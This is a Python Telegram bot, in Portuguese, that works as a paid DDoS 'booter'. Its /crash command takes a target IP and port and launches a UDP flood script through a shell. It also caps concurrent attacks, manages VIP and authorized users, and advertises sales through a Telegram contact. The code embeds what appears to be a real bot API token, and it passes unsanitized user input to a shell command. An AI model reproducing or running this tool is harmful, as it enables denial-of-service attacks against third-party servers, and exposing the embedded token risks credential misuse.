import os
import subprocess
import telebot
from threading import Thread

# Token e ID do dono
API_TOKEN = '7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8'
OWNER_ID = 6430703027

# Inicialização do bot
bot = telebot.TeleBot(API_TOKEN)

# Listas de usuários
authorized_users = [OWNER_ID]
vip_users = []
vip_commands = []
processes = []  # Lista para armazenar processos ativos
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processes) >= MAX_ATTACKS:
        # Mata o processo mais antigo
        oldest_process = processes.pop(0)
        if oldest_process.poll() is None:  # Verifica se o processo ainda está ativo
            oldest_process.terminate()

# Comando /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "👋 Bem-vindo ao bot!\n\n"
        "📜 *Comandos disponíveis:*\n"
        "🔥 `/crash <IP:PORT> <duração>` - Envia um ataque ao IP especificado.\n"
        "🆔 `/meuid` - Mostra seu ID de usuário.\n"
        "🤖 `/comprarbot` - Informações para adquirir seu próprio bot.\n\n"
        "🌟 *Comandos para VIPs e dono:*\n"
        "➕ `/adduser <ID>` - Adiciona um usuário autorizado.\n"
        "➖ `/removeuser <ID>` - Remove um usuário autorizado.\n"
        "🏆 `/promovervip <ID>` - Promove um usuário a VIP.\n"
        "⬇️ `/rebaixarvip <ID>` - Remove o status de VIP de um usuário.\n\n"
        "🔐 *Comandos exclusivos do dono:*\n"
        "🔗 `/addcomandovip <comando>` - Restringe o comando para VIPs.\n"
        "🚫 `/revcomandovip <comando>` - Remove a restrição de comando VIP.\n"
        "📋 `/listusers` - Mostra a lista de usuários registrados e seus cargos.\n"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if '/crash' in vip_commands and not (message.from_user.id in vip_users or message.from_user.id == OWNER_ID):
        bot.send_message(message.chat.id, "⚠️ Apenas VIPs podem usar este comando.")
        return

    try:
        command_parts = message.text.split()
        
        # Se o comando tiver apenas o IP:PORT, o bot vai adicionar a potência 10 e a duração 900
        if len(command_parts) == 2:
            ip_port = command_parts[1]
            power = 10  # Valor padrão para potência
            duration = 900  # Valor padrão para duração
        # Se o comando tiver o IP:PORT e a duração, o bot vai adicionar a potência 10
        elif len(command_parts) == 3:
            ip_port = command_parts[1]
            duration = command_parts[2]
            power = 10  # Valor padrão para potência
        # Se o comando tiver IP:PORT, potência e duração, o bot vai usar os valores fornecidos
        elif len(command_parts) == 4:
            ip_port = command_parts[1]
            power = command_parts[2]
            duration = command_parts[3]
        else:
            bot.send_message(message.chat.id, "❌ Uso correto: `/crash <IP:PORT> <duração>`", parse_mode="Markdown")
            return

        if ':' not in ip_port:
            bot.send_message(message.chat.id, "⚠️ Formato inválido de IP e porta. Use o formato: `IP:PORT`", parse_mode="Markdown")
            return

        # Gerencia o limite de ataques simultâneos
        manage_attacks()

        # Monta o comando e executa no terminal
        command = f"python start.py UDP {ip_port} {power} {duration}"
        process = subprocess.Popen(command, shell=True)
        processes.append(process)

        bot.send_message(
            message.chat.id,
            f"✅ Ataque enviado para {ip_port} com potência {power} por {duration} segundos! 🚀"
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ocorreu um erro: {str(e)}")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"🆔 Seu ID de usuário é: `{message.from_user.id}`", parse_mode="Markdown")

# Comando /listusers
@bot.message_handler(commands=['listusers'])
def list_users(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "⚠️ Você não tem permissão para usar este comando.")
        return

    user_list = "📋 *Lista de usuários registrados e seus cargos:*\n"

    for user_id in authorized_users:
        if user_id == OWNER_ID:
            user_list += f"👑 `{user_id}` - Dono\n"
        elif user_id in vip_users:
            user_list += f"🌟 `{user_id}` - VIP\n"
        else:
            user_list += f"👤 `{user_id}` - Autorizado\n"

    bot.send_message(message.chat.id, user_list, parse_mode="Markdown")

# Comando /comprarbot
@bot.message_handler(commands=['comprarbot'])
def comprar_bot(message):
    bot.send_message(
        message.chat.id,
        (
            "🤖✨ *Quer ter um bot como este?* ✨🤖\n\n"
            "📥 *Entre em contato agora mesmo para adquirir o seu!*\n"
            "📲 [Clique aqui para falar comigo no Telegram](https://t.me/werbert_ofc)\n\n"
            "💡 *Não perca a chance de ter seu próprio bot exclusivo!*"
        ),
        parse_mode="Markdown"
    )

# Comandos de administração
@bot.message_handler(commands=['adduser', 'removeuser', 'promovervip', 'rebaixarvip', 'addcomandovip', 'revcomandovip'])
def admin_commands(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "⚠️ Você não tem permissão para usar este comando.")
        return

    command = message.text.split()
    if len(command) < 2:
        bot.send_message(message.chat.id, "❌ Uso incorreto. Consulte os comandos válidos no /start.")
        return

    user_id = int(command[1])

    if command[0] == '/adduser':
        if user_id not in authorized_users:
            authorized_users.append(user_id)
            bot.send_message(message.chat.id, f"✅ Usuário `{user_id}` adicionado como autorizado.", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, f"⚠️ Usuário `{user_id}` já está na lista de autorizados.", parse_mode="Markdown")

    elif command[0] == '/removeuser':
        if user_id in authorized_users:
            authorized_users.remove(user_id)
            bot.send_message(message.chat.id, f"✅ Usuário `{user_id}` removido da lista de autorizados.", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, f"⚠️ Usuário `{user_id}` não está na lista de autorizados.", parse_mode="Markdown")

    elif command[0] == '/promovervip':
        if user_id not in vip_users:
            vip_users.append(user_id)
            bot.send_message(message.chat.id, f"🌟 Usuário `{user_id}` promovido a VIP.", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, f"⚠️ Usuário `{user_id}` já é VIP.", parse_mode="Markdown")

    elif command[0] == '/rebaixarvip':
        if user_id in vip_users:
            vip_users.remove(user_id)
            bot.send_message(message.chat.id, f"⬇️ Usuário `{user_id}` rebaixado de VIP.", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, f"⚠️ Usuário `{user_id}` não é VIP.", parse_mode="Markdown")

# Inicia o bot
bot.polling()